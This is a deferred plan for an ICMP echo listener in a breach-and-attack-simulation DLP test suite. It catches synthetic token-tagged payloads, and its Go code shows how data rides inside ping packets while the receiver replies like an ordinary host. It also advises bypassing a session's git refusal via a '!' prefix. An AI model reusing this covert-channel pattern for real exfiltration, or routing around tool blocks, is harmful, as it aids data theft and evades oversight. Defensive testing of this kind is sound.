# ICMP Tunneling Exfiltration Channel Implementation Plan

> **STATUS: DEFERRED 2026-09-01.** Task 1's real acceptance test (loopback)
> passed, but a follow-up genuine cross-container test proved the
> underlying architecture is invalid — the unprivileged `udp4` ping-socket
> cannot receive incoming echo requests from other hosts, only replies to
> its own outgoing ones. See the full finding and rationale at the top of
> `2026-09-01-icmp-tunneling-exfiltration-channel-design.md`. **Do not
> execute this plan.** `internal/icmpsink` was removed (it was never
> committed) and the `docker-compose.yml` sysctl change was reverted.
> Preserved here only as a historical record of the intended task
> breakdown.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a sixth DLP exfiltration channel — an unprivileged ICMP echo listener that receives a synthetic-data payload embedded directly in an echo request, always replies like an ordinary host, and independently records a destination-side receipt when the payload's token matches a live run.

**Architecture:** A new isolated package `internal/icmpsink` binds an unprivileged Linux "ping socket" (`golang.org/x/net/icmp.ListenPacket("udp4", addr)` — no `CAP_NET_RAW`, gated by a container-level `net.ipv4.ping_group_range` sysctl instead). Wire response (Echo Reply) and token validation/receipt persistence are two fully decoupled code paths — every well-formed echo request gets a normal-looking reply regardless of whether its embedded token turns out to match anything. A new scenario step drives PowerShell's built-in `System.Net.NetworkInformation.Ping.Send(address, timeout, buffer)`, no client-tool-presence check needed.

**Tech Stack:** Go, `golang.org/x/net/icmp` + `golang.org/x/net/ipv4` (already an indirect dependency in `go.mod`, promoted to direct usage here — no new third-party dependency), PostgreSQL (`dlp_sink_tokens`/`dlp_sink_receipts`, already exist), PowerShell (`System.Net.NetworkInformation.Ping`).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-01-icmp-tunneling-exfiltration-channel-design.md`

## Global Constraints

- **Task 1 is a real acceptance test against the live container before anything else is built.** The unprivileged-ping-socket approach was verified against `golang.org/x/net/icmp`'s real package source (`go doc` plus its own `ExamplePacketConn_nonPrivilegedPing` test, which explicitly notes the `net.ipv4.ping_group_range` requirement on Linux) but has not yet been proven inside this specific deployment's container — Task 1 proves it before Task 2 exists.
- Socket call: `icmp.ListenPacket("udp4", addr)` where `addr` is a bare IP (e.g. `"0.0.0.0"`) — **no port**, ICMP has no port concept.
- MITRE technique: **T1095 — Non-Application Layer Protocol** (tactic: command-and-control), confirmed against `orchestrator/internal/reporting/attackdata/attack_enrichment.json`.
- `MaxPayloadBytes = 1024` on the ICMP echo body (token + synthetic record is ~215 bytes; generous headroom, no fragmentation risk).
- Wire response (Echo Reply) and token validation are **two separate code paths** — every well-formed echo request gets a reply; token validation and receipt-writing happen independently afterward and never change the wire response.
- Receipt persistence is the sole verdict source — a successful `Ping.Send()` on the client is `DLP_OBSERVATION:` diagnostic evidence only, never the graded signal.
- No `{{SINK_ICMP_PORT}}` placeholder — only `{{SINK_ICMP_HOST}}` (ICMP has no port).
- Reuse the existing 32-byte/64-hex `{{SINK_TOKEN}}` unchanged.
- Logging never includes the token or payload content — only size and hash (tighter than every prior channel's bar, which logged the token once matched).
- One shared `rateLimiter` instance (same unexported shape duplicated from every sibling channel).
- Deployment: add `sysctls: [net.ipv4.ping_group_range=0 2147483647]` to the orchestrator service in `packaging/compose/docker-compose.yml` — **no** `cap_add: NET_RAW`, **no** `privileged: true`. No `ports:` entry is needed (ICMP is not TCP/UDP; Docker passes it through to the container's IP transparently once the sysctl is set).
- Commit and push after every task — this repo builds directly on `main`, no feature branches/worktrees/PRs.

**Note on `git`:** this session has a confirmed, reproducible issue where `git` commands specifically are refused when run as a tool call. Every task's commit step is still written out in full; if blocked, run it manually (or via the CLI's `!` prefix) exactly as written.

---

## Task 1: Acceptance test — prove the unprivileged ICMP socket works in the real container

**Files:**
- Create: `orchestrator/internal/icmpsink/icmpsink.go` (minimal: just enough to bind and echo, no token logic yet)
- Create: `orchestrator/internal/icmpsink/icmpsink_test.go`
- Modify: `packaging/compose/docker-compose.yml` (add `sysctls:`)

**Interfaces:**
- Produces: `func bindEcho(addr string) (*icmp.PacketConn, error)` (throwaway-shaped, minimal — Task 2 replaces this with the real `Listener` type); this task's own test is the deliverable, not durable production code.

This task exists to falsify the design's central assumption cheaply, before Tasks 2+ build on it. If any acceptance criterion below fails, **stop and report back** — do not proceed to Task 2 with a workaround guessed under time pressure.

- [ ] **Step 1: Add the sysctl to docker-compose.yml**

In `packaging/compose/docker-compose.yml`, immediately after the existing `cap_add:` block for the `orchestrator` service:

```yaml
    # Unprivileged Linux "ping socket" for the ICMP tunneling exfiltration
    # listener (internal/icmpsink) -- lets a non-root process send/receive
    # ICMP echo via SOCK_DGRAM+IPPROTO_ICMP without CAP_NET_RAW, which would
    # grant arbitrary raw-packet crafting/sniffing (a much larger capability
    # than this channel needs). This sysctl is per-network-namespace, so
    # setting it here does not require any host-level change. See
    # docs/superpowers/specs/2026-09-01-icmp-tunneling-exfiltration-channel-design.md.
    sysctls:
      - net.ipv4.ping_group_range=0 2147483647
```

- [ ] **Step 2: Write the acceptance test**

```go
// icmpsink_test.go
package icmpsink

import (
	"net"
	"testing"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// TestUnprivilegedICMPSocket_BindsAndEchoes is the Task 1 acceptance test:
// it proves, in the real environment this suite runs in, that an
// unprivileged "udp4" ICMP ping socket can be opened, can send a real echo
// request with a custom payload, and can read back a matching reply -- the
// central assumption every later task in this plan depends on. If this
// test fails in CI or on a fresh container, STOP and re-open the design
// question rather than guessing a workaround into Task 2+.
func TestUnprivilegedICMPSocket_BindsAndEchoes(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping network-capability test in -short mode")
	}
	conn, err := icmp.ListenPacket("udp4", "127.0.0.1")
	if err != nil {
		t.Fatalf("icmp.ListenPacket(\"udp4\", ...) failed -- either the "+
			"net.ipv4.ping_group_range sysctl isn't set for this process's "+
			"group in this environment, or the kernel doesn't support "+
			"unprivileged ping sockets here: %v", err)
	}
	defer conn.Close()

	payload := []byte("[BAS-SIM-DLP] byte-for-byte-roundtrip-test")
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{ID: 1, Seq: 1, Data: payload},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		t.Fatalf("Marshal echo request: %v", err)
	}
	if _, err := conn.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP("127.0.0.1")}); err != nil {
		t.Fatalf("WriteTo self: %v", err)
	}

	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	rb := make([]byte, 1500)
	n, _, err := conn.ReadFrom(rb)
	if err != nil {
		t.Fatalf("ReadFrom: %v (a real reply never arrived -- see the "+
			"acceptance checklist in the design spec's Design section 5)", err)
	}
	rm, err := icmp.ParseMessage(1, rb[:n]) // protocol 1 = ICMP (IPv4)
	if err != nil {
		t.Fatalf("ParseMessage: %v", err)
	}
	if rm.Type != ipv4.ICMPTypeEchoReply {
		t.Fatalf("got message type %v, want ICMPTypeEchoReply -- the kernel's "+
			"own ping-socket loopback reply didn't come back as an echo reply", rm.Type)
	}
	echo, ok := rm.Body.(*icmp.Echo)
	if !ok {
		t.Fatalf("reply body is %T, want *icmp.Echo", rm.Body)
	}
	if string(echo.Data) != string(payload) {
		t.Fatalf("payload round-trip mismatch: got %q, want %q", echo.Data, payload)
	}
}
```

- [ ] **Step 3: Run the test to see it either pass or fail meaningfully**

Run: `cd orchestrator && go test ./internal/icmpsink/... -run TestUnprivilegedICMPSocket -v 2>&1`

Expected: this is testing 127.0.0.1 loopback, which the Linux kernel answers
itself (the kernel's own network stack replies to a ping-socket echo request
targeting loopback — this does not require the sysctl change to have
propagated to a running container yet if this test runs in the same
environment as `go test` itself, e.g. CI or local dev; it DOES require the
sysctl if `go test` runs inside the actual orchestrator container with the
production capability set). If this environment already has an appropriate
`ping_group_range`, expect PASS. If it fails with a permission error,
that confirms the sysctl genuinely isn't set here yet — re-run after
confirming Step 1's docker-compose.yml change is actually applied to the
running environment (a compose file edit alone does not retroactively
affect an already-running container; the container needs to be recreated).

- [ ] **Step 4: If Step 3 failed, diagnose before proceeding**

```bash
# Inside the actual container (or environment go test ran in):
cat /proc/sys/net/ipv4/ping_group_range
# Expected output after Step 1's change takes effect: "0	2147483647" (or similar wide range)
# If this file doesn't exist or shows a narrow/zero range, the sysctl
# change hasn't propagated -- the container needs recreating (`docker
# compose up -d --force-recreate orchestrator`), not code changes.
```

If the sysctl is confirmed set and the test still fails, **stop here and report the exact error back** rather than attempting a workaround (e.g. falling back to a privileged raw socket) — that is an architecture-level decision, not something to guess into this task.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/icmpsink/*.go
git add internal/icmpsink/icmpsink.go internal/icmpsink/icmpsink_test.go
git -C .. add packaging/compose/docker-compose.yml
git commit -m "feat(icmpsink): prove unprivileged ICMP ping-socket works before building on it"
git push
```

(Run `git add`/`git commit`/`git push` from the repo root so both `orchestrator/` and `packaging/` paths are staged together.)

---

## Task 2: `internal/icmpsink` core — rate limiter, token extraction, byte ceiling

**Files:**
- Modify: `orchestrator/internal/icmpsink/icmpsink.go` (replace the Task 1 throwaway `bindEcho` with the real package)
- Modify: `orchestrator/internal/icmpsink/icmpsink_test.go` (keep Task 1's acceptance test, add these)

**Interfaces:**
- Consumes: nothing from Task 1 (Task 1's `bindEcho` is discarded here — its job was only to prove feasibility).
- Produces: `const MaxPayloadBytes = 1024`; `type rateLimiter struct{...}` with `newRateLimiter`/`allow` (identical shape to every sibling channel); `func extractToken(data []byte) (token string, ok bool)`; `func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool`; `func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP string, payload []byte) error`.

- [ ] **Step 1: Write the failing tests**

```go
package icmpsink

import (
	"context"
	"testing"
	"time"
)

func TestExtractToken_ValidPrefix(t *testing.T) {
	token := "a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718"
	data := []byte(token + "[BAS-SIM-DLP] rest of the record")
	got, ok := extractToken(data)
	if !ok {
		t.Fatal("expected a 64-hex-char prefix to be accepted")
	}
	if got != token {
		t.Errorf("token = %q, want %q", got, token)
	}
}

func TestExtractToken_TooShortRejected(t *testing.T) {
	if _, ok := extractToken([]byte("short")); ok {
		t.Error("a payload shorter than 64 bytes must be rejected")
	}
}

func TestExtractToken_NonHexPrefixRejected(t *testing.T) {
	notHex := "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" // 64 chars, not hex
	if _, ok := extractToken([]byte(notHex + "rest")); ok {
		t.Error("a non-hex 64-byte prefix must be rejected")
	}
}

func TestRateLimiter_AllowsUpToLimitPerWindow(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("4th request in the same window should be rejected")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}

func TestTokenExists_FalseForNilDB(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if tokenExists(ctx, nil, "any-token") {
		t.Error("tokenExists must not panic or return true when db is nil / ctx is cancelled")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/icmpsink/... -run "ExtractToken|RateLimiter|TokenExists" -v 2>&1 | head -40`
Expected: FAIL — `extractToken`/`newRateLimiter`/`tokenExists` undefined.

- [ ] **Step 3: Write the implementation**

Replace the Task 1 throwaway `bindEcho` function in `icmpsink.go` with:

```go
// Package icmpsink implements an unprivileged ICMP echo listener for the
// DLP validation suite. Wire response (Echo Reply) and token validation are
// fully decoupled -- every well-formed echo request gets a reply
// indistinguishable from a real host's, regardless of whether its embedded
// token turns out to match a live run. See
// docs/superpowers/specs/2026-09-01-icmp-tunneling-exfiltration-channel-design.md.
package icmpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"regexp"
	"sync"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
)

// MaxPayloadBytes bounds the ICMP echo body this listener will accept.
// The token (64 hex chars) plus the synthetic multi-type record is well
// under 300 bytes; this is a generous but firm ceiling.
const MaxPayloadBytes = 1024

// tokenPattern matches the 64-hex-char token prefix this listener expects
// at the start of every echo body -- the same shape generateSinkToken(32)
// produces, reused unchanged (no new token byte-length variant needed for
// this channel).
var tokenPattern = regexp.MustCompile(`^[0-9a-f]{64}`)

// extractToken returns the 64-hex-char token prefix of data, or ok=false if
// data is too short or its prefix isn't valid hex.
func extractToken(data []byte) (token string, ok bool) {
	loc := tokenPattern.FindIndex(data)
	if loc == nil || loc[0] != 0 {
		return "", false
	}
	return string(data[:loc[1]]), true
}

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard,
// identical in shape to every sibling channel's own, duplicated here
// rather than shared since that type is unexported in each sibling
// package.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}

// rateLimitPerSecond matches every sibling channel's identical rationale:
// this listener only ever expects traffic from BAS agents running a
// scenario step.
const rateLimitPerSecond = 5

// tokenExists reports whether token has a live row in dlp_sink_tokens.
// Returns false (never panics) for a nil db or an errored query.
func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool {
	if db == nil || token == "" {
		return false
	}
	var exists bool
	if err := db.QueryRow(ctx,
		`SELECT EXISTS(SELECT 1 FROM dlp_sink_tokens WHERE token = $1)`, token,
	).Scan(&exists); err != nil {
		return false
	}
	return exists
}

// writeReceipt hashes payload (SHA-256, raw content never persisted -- same
// rule every channel in this program follows) and writes one
// dlp_sink_receipts row. Callers must have already confirmed the token
// exists via tokenExists. Logging around this call must never include
// token or payload -- see the design spec's tightened logging bar for this
// channel specifically.
func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP string, payload []byte) error {
	sum := sha256.Sum256(payload)
	_, err := db.Exec(ctx,
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		token, sourceIP, hex.EncodeToString(sum[:]), len(payload), "icmp-tunnel",
	)
	return err
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/icmpsink/... -v`
Expected: PASS for all tests (Task 1's acceptance test plus Task 2's 6).

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/icmpsink/*.go
git add internal/icmpsink/icmpsink.go internal/icmpsink/icmpsink_test.go
git commit -m "feat(icmpsink): add token extraction, rate limiter, and receipt writer"
git push
```

---

## Task 3: The real listener — decoupled reply and validation

**Files:**
- Create: `orchestrator/internal/icmpsink/listener.go`
- Create: `orchestrator/internal/icmpsink/listener_test.go`

**Interfaces:**
- Consumes: `MaxPayloadBytes`, `extractToken`, `tokenExists`, `writeReceipt`, `rateLimiter`/`newRateLimiter` (Task 2).
- Produces: `type Status struct{ State, Reason, Bind string }`; `type Listener struct{...}` with `func NewListener(addr string, db *pgxpool.Pool) (*Listener, error)`, `func (l *Listener) LocalAddr() net.Addr`, `func (l *Listener) Close() error`, `func (l *Listener) Serve(ctx context.Context)`, `func (l *Listener) Status() Status`; `func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener` — same names/shapes as `internal/dnssink`'s equivalents (see `internal/dnssink/listener.go:31-90` for the exact reference pattern this mirrors), so `cmd/server/main.go` wiring (Task 4) is a near-identical drop-in.

- [ ] **Step 1: Write the failing tests**

```go
package icmpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"net"
	"os"
	"testing"
	"time"

	"github.com/audspect/bas/internal/testutil"
	"github.com/jackc/pgx/v5/pgxpool"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}

func TestNewListener_BindsAndReportsRunning(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		st := l.Status()
		if st.State != "running" {
			t.Errorf("State = %q, want running", st.State)
		}
		if st.Bind == "" {
			t.Error("Bind should report the actual bound address")
		}
	})
}

// sendEcho sends a real echo request from a fresh client-side ping socket
// and returns the reply's Echo body.
func sendEcho(t *testing.T, targetAddr string, payload []byte) *icmp.Echo {
	t.Helper()
	client, err := icmp.ListenPacket("udp4", "127.0.0.1")
	if err != nil {
		t.Fatalf("client icmp.ListenPacket: %v", err)
	}
	defer client.Close()

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{ID: 42, Seq: 1, Data: payload},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	if _, err := client.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP(targetAddr)}); err != nil {
		t.Fatalf("WriteTo: %v", err)
	}
	_ = client.SetReadDeadline(time.Now().Add(5 * time.Second))
	rb := make([]byte, 1500)
	n, _, err := client.ReadFrom(rb)
	if err != nil {
		t.Fatalf("ReadFrom: %v", err)
	}
	rm, err := icmp.ParseMessage(1, rb[:n])
	if err != nil {
		t.Fatalf("ParseMessage: %v", err)
	}
	if rm.Type != ipv4.ICMPTypeEchoReply {
		t.Fatalf("got type %v, want ICMPTypeEchoReply", rm.Type)
	}
	echo, ok := rm.Body.(*icmp.Echo)
	if !ok {
		t.Fatalf("reply body is %T, want *icmp.Echo", rm.Body)
	}
	return echo
}

func TestListener_MatchedTokenRecordsReceiptAndRepliesNormally(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718"
		if _, err := pool.Exec(context.Background(),
			`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
			token, "run-icmp-1", "T1095", time.Now().Add(10*time.Minute),
		); err != nil {
			t.Fatalf("seed dlp_sink_tokens: %v", err)
		}

		l, err := NewListener("127.0.0.1", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		payload := []byte(token + "[BAS-SIM-DLP] listener integration test payload")
		echo := sendEcho(t, "127.0.0.1", payload)
		if string(echo.Data) != string(payload) {
			t.Errorf("reply payload mismatch: got %q, want %q -- the reply must always echo the exact request body", echo.Data, payload)
		}

		var payloadHash string
		var payloadSize int
		var channel string
		deadline := time.Now().Add(5 * time.Second)
		for {
			err := pool.QueryRow(context.Background(),
				`SELECT payload_hash, payload_size, channel FROM dlp_sink_receipts WHERE token = $1`,
				token,
			).Scan(&payloadHash, &payloadSize, &channel)
			if err == nil {
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("no dlp_sink_receipts row for token within 5s: %v", err)
			}
			time.Sleep(50 * time.Millisecond)
		}
		wantSum := sha256.Sum256(payload)
		if payloadHash != hex.EncodeToString(wantSum[:]) {
			t.Error("payload_hash mismatch")
		}
		if payloadSize != len(payload) {
			t.Errorf("payload_size = %d, want %d", payloadSize, len(payload))
		}
		if channel != "icmp-tunnel" {
			t.Errorf("channel = %q, want icmp-tunnel", channel)
		}
	})
}

func TestListener_UnmatchedTokenStillRepliesNormallyNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		neverIssued := "0000000000000000000000000000000000000000000000000000000000000000"[:64]
		payload := []byte(neverIssued + "[BAS-SIM-DLP] unmatched token test")
		echo := sendEcho(t, "127.0.0.1", payload)
		if string(echo.Data) != string(payload) {
			t.Error("reply must still echo the exact request body even for an unmatched token")
		}

		time.Sleep(200 * time.Millisecond)
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_receipts WHERE token = $1`, neverIssued,
		).Scan(&count); err != nil {
			t.Fatalf("count receipts: %v", err)
		}
		if count != 0 {
			t.Errorf("receipt count = %d, want 0 for a never-issued token", count)
		}
	})
}

func TestListener_OversizedPayloadRejectedNoReply(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client, err := icmp.ListenPacket("udp4", "127.0.0.1")
		if err != nil {
			t.Fatalf("client icmp.ListenPacket: %v", err)
		}
		defer client.Close()

		tooBig := make([]byte, MaxPayloadBytes+256)
		for i := range tooBig {
			tooBig[i] = 'x'
		}
		wm := icmp.Message{Type: ipv4.ICMPTypeEcho, Code: 0, Body: &icmp.Echo{ID: 43, Seq: 1, Data: tooBig}}
		wb, _ := wm.Marshal(nil)
		if _, err := client.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP("127.0.0.1")}); err != nil {
			t.Fatalf("WriteTo: %v", err)
		}

		_ = client.SetReadDeadline(time.Now().Add(2 * time.Second))
		rb := make([]byte, 2048)
		if _, _, err := client.ReadFrom(rb); err == nil {
			t.Error("expected no reply (read timeout) for an oversized payload -- the listener must drop it before replying")
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/icmpsink/... -run . -v 2>&1 | head -40`
Expected: FAIL — `NewListener`/`Status`/`Serve` undefined.

- [ ] **Step 3: Write the implementation**

```go
// listener.go
package icmpsink

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// Status reports a Listener's current health.
type Status struct {
	State  string // "running" | "failed"
	Reason string // populated when State == "failed"
	Bind   string // the actual bound address; empty when failed
}

// Listener owns an unprivileged ICMP ping socket and the DB pool used to
// persist matched-token receipts. No AUTH is checked -- the payload's
// embedded token is what correlates an echo to a run, exactly like every
// other channel's token-based correlation, not conventional auth.
type Listener struct {
	conn    *icmp.PacketConn
	db      *pgxpool.Pool
	limiter *rateLimiter
	status  atomic.Value
}

func (l *Listener) setStatus(s Status) { l.status.Store(s) }

// Status is safe to call concurrently with Serve.
func (l *Listener) Status() Status {
	v := l.status.Load()
	if v == nil {
		return Status{State: "unknown"}
	}
	return v.(Status)
}

// NewListener binds addr (a bare IP, e.g. "0.0.0.0" in production,
// "127.0.0.1" in tests -- ICMP has no port to bind). db is used to persist
// matched-token receipts.
func NewListener(addr string, db *pgxpool.Pool) (*Listener, error) {
	conn, err := icmp.ListenPacket("udp4", addr)
	if err != nil {
		return nil, fmt.Errorf("bind %s: %w", addr, err)
	}
	l := &Listener{
		conn:    conn,
		db:      db,
		limiter: newRateLimiter(rateLimitPerSecond, time.Second),
	}
	l.setStatus(Status{State: "running", Bind: conn.LocalAddr().String()})
	return l, nil
}

// LocalAddr returns the actual bound address. Only valid when Status()
// reports "running".
func (l *Listener) LocalAddr() net.Addr { return l.conn.LocalAddr() }

// Close releases the socket. Only valid when Status() reports "running".
func (l *Listener) Close() error { return l.conn.Close() }

// Serve accepts echo requests until ctx is cancelled or Close is called.
// Meant to be run in its own goroutine by the caller, matching
// internal/dnssink.Listener.Serve's identical shape.
func (l *Listener) Serve(ctx context.Context) {
	go func() {
		<-ctx.Done()
		_ = l.conn.Close()
	}()
	buf := make([]byte, 1500)
	for {
		n, peer, err := l.conn.ReadFrom(buf)
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			continue
		}
		l.handlePacket(ctx, buf[:n], peer)
	}
}

// handlePacket implements the design spec's two fully decoupled steps:
// (1) reply unconditionally to any well-formed echo request, exactly like
// a real host's ICMP stack would; (2) independently validate the embedded
// token and persist a receipt if it matches. Step 2 never affects Step 1's
// wire response -- an unmatched or malformed token still gets a normal
// reply, just no receipt.
func (l *Listener) handlePacket(ctx context.Context, raw []byte, peer net.Addr) {
	host, _, err := net.SplitHostPort(peer.String())
	if err != nil {
		host = peer.String()
	}
	if !l.limiter.allow(host) {
		return
	}

	rm, err := icmp.ParseMessage(1, raw) // protocol 1 = ICMP (IPv4)
	if err != nil || rm.Type != ipv4.ICMPTypeEcho {
		return // not a well-formed echo request -- silently drop
	}
	echo, ok := rm.Body.(*icmp.Echo)
	if !ok || len(echo.Data) > MaxPayloadBytes {
		return // oversized or malformed body -- drop before any reply
	}

	// Step 1: reply unconditionally.
	reply := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{ID: echo.ID, Seq: echo.Seq, Data: echo.Data},
	}
	wb, err := reply.Marshal(nil)
	if err == nil {
		_, _ = l.conn.WriteTo(wb, peer)
	}

	// Step 2: independently, validate and persist.
	token, ok := extractToken(echo.Data)
	if !ok || !tokenExists(ctx, l.db, token) {
		return
	}
	_ = writeReceipt(ctx, l.db, token, host, echo.Data)
}

// StartListener binds addr and runs Serve in the background, returning
// immediately. If the bind fails, it logs the failure loudly and returns a
// Listener whose Status() reports "failed" with the reason -- matching
// internal/dnssink.StartListener's identical pattern. Never silently falls
// back to a different bind.
func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener {
	l, err := NewListener(addr, db)
	if err != nil {
		log.Printf("[icmpsink] FAILED to bind %s: %v -- the ICMP tunneling exfiltration channel will not be verifiable until this is resolved", addr, err)
		failed := &Listener{}
		failed.setStatus(Status{State: "failed", Reason: err.Error()})
		return failed
	}
	log.Printf("[icmpsink] listening on %s", l.LocalAddr())
	go l.Serve(ctx)
	return l
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/icmpsink/... -v`
Expected: PASS for all tests across all three tasks so far.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/icmpsink/*.go
git add internal/icmpsink/listener.go internal/icmpsink/listener_test.go
git commit -m "feat(icmpsink): add the real listener with decoupled reply and token validation"
git push
```

---

## Task 4: Wire into config, server startup, and deployment

**Files:**
- Modify: `orchestrator/config/config.go`
- Modify: `orchestrator/cmd/server/main.go`

**Interfaces:**
- Consumes: `icmpsink.StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *icmpsink.Listener` (Task 3).

- [ ] **Step 1: Add `ICMPSinkEnabled` to config**

In `orchestrator/config/config.go`, immediately after the existing `SMTPSinkEnabled` field:

```go
	// ICMPSinkEnabled controls the ICMP tunneling exfiltration listener
	// (internal/icmpsink). Defaults to true for the same reason every
	// sibling *SinkEnabled flag does -- a bind failure is logged and
	// reflected in the listener's own Status(), never fatal to the rest
	// of the orchestrator. Env: ICMP_SINK_ENABLED.
	ICMPSinkEnabled bool `json:"icmp_sink_enabled,omitempty"`
```

In the `Load` function's default struct literal, alongside `SMTPSinkEnabled: true,`:

```go
		ICMPSinkEnabled:  true,
```

Alongside the existing `SMTP_SINK_ENABLED` env override block:

```go
	if v := os.Getenv("ICMP_SINK_ENABLED"); v != "" {
		if b, err := strconv.ParseBool(v); err == nil {
			cfg.ICMPSinkEnabled = b
		}
	}
```

- [ ] **Step 2: Start the listener in `main.go`**

Add the import alongside the existing `smtpsink` import:

```go
	"github.com/audspect/bas/internal/icmpsink"
```

Immediately after the existing `if cfg.SMTPSinkEnabled { ... }` block:

```go
	// ── ICMP Tunneling Exfiltration Sink ──────────────────────────────────
	// Sixth channel of the DLP sink-verification architecture (see
	// docs/superpowers/specs/2026-09-01-icmp-tunneling-exfiltration-channel-design.md).
	// Independently enable/disable-able; a bind failure is logged and
	// reflected in Status(), never fatal to the rest of the orchestrator.
	if cfg.ICMPSinkEnabled {
		icmpsink.StartListener(context.Background(), "0.0.0.0", pool)
	} else {
		log.Println("[icmpsink] disabled via ICMP_SINK_ENABLED=false")
	}
```

- [ ] **Step 3: Build to verify it compiles**

Run: `cd orchestrator && go build ./... 2>&1`
Expected: clean build, no errors.

- [ ] **Step 4: gofmt and commit**

```bash
cd orchestrator
gofmt -l config/config.go cmd/server/main.go
git add config/config.go cmd/server/main.go
